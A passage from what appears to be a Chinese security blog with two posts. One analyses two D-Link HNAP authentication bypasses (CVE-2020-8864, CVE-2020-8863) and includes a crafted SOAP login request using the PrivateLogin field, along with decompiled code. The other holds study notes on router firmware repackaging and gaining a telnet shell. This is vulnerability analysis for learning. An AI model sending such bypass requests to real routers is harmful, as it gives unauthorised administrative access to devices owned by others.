        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-13 14:41:33" itemprop="dateCreated datePublished" datetime="2021-07-13T14:41:33+08:00">2021-07-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:16:53" itemprop="dateModified" datetime="2022-02-21T16:16:53+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="D-Link两个认证绕过漏洞的分析"><a href="#D-Link两个认证绕过漏洞的分析" class="headerlink" title="D-Link两个认证绕过漏洞的分析"></a>D-Link两个认证绕过漏洞的分析</h1><h2 id="01-HNAP简介"><a href="#01-HNAP简介" class="headerlink" title="01-HNAP简介"></a>01-HNAP简介</h2><ul>
<li>Home Network Administration Protocol，家庭网络管理协议</li>
<li>基于SOAP的协议</li>
<li>被认为是UPnP的直接竞争对手</li>
<li>该协议的主要用户是Cisco和D-Link，两者都分别在2012年和<a href="https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10066" target="_blank" rel="noopener">2016年</a>停止使用此协议</li>
<li>此功能通常在管理面板中隐藏，因此无法禁用</li>
<li>一种过时的专有协议：如果您的路由器仍支持HNAP，则可能意味着您的路由器需要升级</li>
<li>HNAP提供两种类型的身份验证方案：Basic and HMAC-based</li>
<li>基于HMAC的身份验证方案：<a href="https://github.com/bikerp/dsp-w215-hnap/wiki/Authentication-process" target="_blank" rel="noopener">https://github.com/bikerp/dsp-w215-hnap/wiki/Authentication-process</a></li>
</ul>
<h2 id="02-HNAP认证过程"><a href="#02-HNAP认证过程" class="headerlink" title="02-HNAP认证过程"></a>02-HNAP认证过程</h2><ol start="0">
<li><p>认证需要两次请求/响应：Authentication to the server (router) requires two transactions. </p>
</li>
<li><p>客户端发送Action为<code>request</code>的请求</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Login</span> <span class="attr">xmlns</span>=<span class="string">"http://purenetworks.com/HNAP1/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Action</span>&gt;</span>request<span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">LoginPassword</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Captcha</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>服务端返回三个值： <code>Challenge</code>, <code>Cookie</code> and <code>PublicKey</code></p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LoginResponse</span> <span class="attr">xmlns</span>=<span class="string">"http://purenetworks.com/HNAP1/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">LoginResult</span>&gt;</span>OK<span class="tag">&lt;/<span class="name">LoginResult</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Challenge</span>&gt;</span>rEmNZG3LUDFUSMJHU55P<span class="tag">&lt;/<span class="name">Challenge</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Cookie</span>&gt;</span>uidpiK0+<span class="tag">&lt;/<span class="name">Cookie</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">PublicKey</span>&gt;</span>vq1w3gFhoIAlc38rEVLO<span class="tag">&lt;/<span class="name">PublicKey</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">BackOff</span>&gt;</span>0<span class="tag">&lt;/<span class="name">BackOff</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LoginResponse</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端发送Action为<code>login</code>的请求：PublicKey+用户密码=PrivateKey、PrivateKey+Challenge=new_value（LoginPassword字段中</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Login</span> <span class="attr">xmlns</span>=<span class="string">"http://purenetworks.com/HNAP1/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Action</span>&gt;</span>login<span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">LoginPassword</span>&gt;</span>new_value<span class="tag">&lt;/<span class="name">LoginPassword</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Captcha</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端验证：对比<code>LoginPassword</code>是否一致（自己计算的和客户端提供的</p>
</li>
</ol>
<h2 id="03-CVE-2020-8864认证绕过"><a href="#03-CVE-2020-8864认证绕过" class="headerlink" title="03-CVE-2020-8864认证绕过"></a>03-CVE-2020-8864认证绕过</h2><ul>
<li>位置：通过<code>strncmp</code>函数来对比<code>LoginPassword</code>时（服务端自己计算的、客户端提供的</li>
<li>代码：<code>strncmp( db_password, attacker_provided_password, strlen(attacker_provided_password));</code></li>
<li>正常逻辑：对比成功，返回0，则认证成功</li>
<li>漏洞逻辑：<ul>
<li>attacker_provided_password为空字符串，<code>strlen()</code> 返回0</li>
<li>strncmp的第三个参数为0时，其不比较任何字符，直接返回0</li>
<li>strncmp：认证成功返回0，空字符串也0，绕过</li>
</ul>
</li>
</ul>
<h2 id="04-CVE-2020-8863认证绕过"><a href="#04-CVE-2020-8863认证绕过" class="headerlink" title="04-CVE-2020-8863认证绕过"></a>04-CVE-2020-8863认证绕过</h2><ul>
<li>漏洞描述：<ul>
<li>D-Link Multiple Routers HNAP PrivateLogin Incorrect Implementation of Authentication Algorithm Authentication Bypass Vulnerability</li>
<li>关键字：PrivateLogin</li>
</ul>
</li>
<li>PrivateKey的生成<ul>
<li>正常认证过程：第二次action为login的请求中，PublicKey+用户密码=PrivateKey</li>
<li>异常：如果在第一次action为request的请求中，提供<code>&lt;PrivateLogin&gt;</code>字段，那么PublicKey+用户名=PrivateKey</li>
</ul>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Login</span> <span class="attr">xmlns</span>=<span class="string">"http://purenetworks.com/HNAP1/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Action</span>&gt;</span>request<span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Username</span>&gt;</span>Admin<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LoginPassword</span>&gt;</span><span class="tag">&lt;/<span class="name">LoginPassword</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">PrivateLogin</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">PrivateLogin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Captcha</span>&gt;</span><span class="tag">&lt;/<span class="name">Captcha</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Login</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined4 <span class="title">Request</span><span class="params">(<span class="keyword">char</span> **param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;    </span><br><span class="line">    <span class="comment">// 1 获取Username、PrivateLogin字段的值</span></span><br><span class="line">    Username = (<span class="keyword">char</span> *)webGetVarString(param_1,<span class="string">"/Login/Username"</span>,uVar2,param_4);</span><br><span class="line">    PrivateLogin = (<span class="keyword">char</span> *)webGetVarString(param_1,<span class="string">"/Login/PrivateLogin"</span>,uVar2,param_4);</span><br><span class="line">    <span class="comment">// 2 如果xxx，从nvram中读取读取admin的密码（取反得到else的含义</span></span><br><span class="line">    <span class="keyword">if</span> ((PrivateLogin == (<span class="keyword">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(PrivateLogin,<span class="string">"Username"</span>,<span class="number">8</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">      GetPassword(Password,<span class="number">0x40</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="comment">// 3 如果PrivateLogin字段不为空，且包含字符串"Username"，则设置Password为Username字段的值</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(Password,Username,<span class="number">0x40</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">		<span class="comment">// 4 生成PrivateKey，Challenge和Publickey在第一次请求时服务端就返回了，唯一未知的就是Password，而在这通过上述strncpy，密码Password设置为了Username字段的值，</span></span><br><span class="line">    GenPrivateKey(Challenge,Password,Publickey,PrivateKey,<span class="number">0x80</span>);</span><br><span class="line">    <span class="comment">// 5 Challenge Publickey Password三者已知，故生成的PrivateKey已知</span></span><br><span class="line">    <span class="comment">// PrivateKey+Challenge=LoginPassword字段，前二已知，故后者已知，而正是通过后者来验证认证的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://www.thezdi.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/07/11/iot/路由器pwn实践/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/11/iot/路由器pwn实践/" class="post-title-link" itemprop="url">路由器pwn实践</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-11 14:41:33" itemprop="dateCreated datePublished" datetime="2021-07-11T14:41:33+08:00">2021-07-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:13:50" itemprop="dateModified" datetime="2022-02-21T16:13:50+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="路由器pwn实践"><a href="#路由器pwn实践" class="headerlink" title="路由器pwn实践"></a>路由器pwn实践</h1><ul>
<li>概要：登录后台、文件备份及恢复功能、获取固件、绕过固件校验实现重打包、开启telnet获取shell、利用mount修改文件内容、逆向程序获得关灯的指令</li>
<li>PS：重点都红线划出了</li>
<li>其它<ul>
<li>lua当cgi后端，类似的，还有什么前后端？//here</li>
<li>报错如404，看信息泄漏</li>
<li>后台敏感功能：ping（可能命令执行）、文件备份及恢复（信息泄漏、系统修改</li>
<li>熵低，加密可能性低</li>
<li>文件校验：大小和完整性（比如有size和crc等字段）</li>
<li>64bit的hash，老路由器，算力不行，排除md5等算法（思路清奇）</li>
<li>lua预编译成字节码文件（是不是类似于pyc），lua结尾，file查看为lua bytecode，一般luadec可反编译，但路由器环境特殊</li>
</ul>
</li>
<li>分析bin文件布局<ul>
<li>c8是zlib开始，binwalk和工具都提及了，主要分析header中字段</li>
<li>size字段很容易识别，计算大小对比即可</li>
<li>完整性字段，多次改变文件，看哪个地方变</li>
</ul>
</li>
<li>敏感文件<ul>
<li>获取文件系统后，找敏感文件，如配置</li>
<li>文件系统内敏感文件，守护进程</li>
<li>与某功能相关的程序，如led灯相关的ledkeytest（随手h/help猜测功能）</li>
</ul>
</li>
<li>定位64bit的hash算法<ul>
<li>大概猜一下流程：data经过zlib压缩，计算出data的crc，放入header，二者组合成最终bin文件</li>
<li>函数流程：传入文件，打开文件，读到缓冲区，压缩数据，填充其他数据</li>
<li>两流程神似，故断定</li>
</ul>
</li>
<li>逆向scpd<ul>
<li>逆向时，敏感字符串或函数名，config/conf/cfg等</li>
<li>除了open、read、write和zlib的压缩函数，只有两个未命名函数</li>
</ul>
</li>
<li>第一个，crc的准备工作<ul>
<li>没有传参，故没有操作文件</li>
<li>对.data段变量的写操作，即对一个全局变量赋值，很可能是初始化某一个表（加密或hash算法时常用到table）</li>
</ul>
</li>
<li>第二个，crc计算，且有两处<ul>
<li>传入了地址和大小</li>
<li>crc常见操作，比如左移右移8啥的</li>
<li>有两处crx计算，一处针对header，一处针对data，再拼接，32+32=64（上述两点从函数内部实现看，此从函数外部的调用看）</li>
</ul>
</li>
<li>判定crc32b<ul>
<li>参数3传入ffffffff，即～0，取反0得f</li>
<li>交换大小段，crc返回值再取反</li>
<li>crc32是左移8，而crc32b是右移8（文字错误图中对）</li>
<li>b应该是big</li>
<li>crc32、crc32b算法待学习//here</li>
</ul>
</li>
<li>获取shell后<ul>
<li>cat /proc/cpuinfo</li>
<li>system type，mt7620，联发科的芯片</li>
<li>32M内存怎么来的？tlb_entries？//here</li>
<li>rootfs不可写怎么知道的？手动测试？一般/tmp是可写的吧//here</li>
</ul>
</li>
<li>逆向ledkeytest<ul>
<li>if判断（/proc/csp/loadtype内容是否为2）、取参数2给s、</li>
<li>do循环、strcmp比较s和e0（e0作为字符串，基址+偏移的形式）、e4作为函数执行</li>
<li>推测：基址是结构体数组首地址、struct=char * + callback回调函数（这种形式很常见）、最终形式是ledkeytest+ledoff</li>
</ul>
</li>
<li>修改loadtype<ul>
<li>表模式，默认是3，2应该是测试模式（lefkeytest即测试程序）</li>
<li>修改1：patch程序，但rootfs不可写，只能固件重打包，风险大</li>
<li>修改2：Linux下通用方法，mount挂载</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://www.52pojie.cn/thread-1400371-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1400371-1-1.html</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/28/">28</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">21Guns</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">164</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">71</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">21Guns</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

</body>
</html>
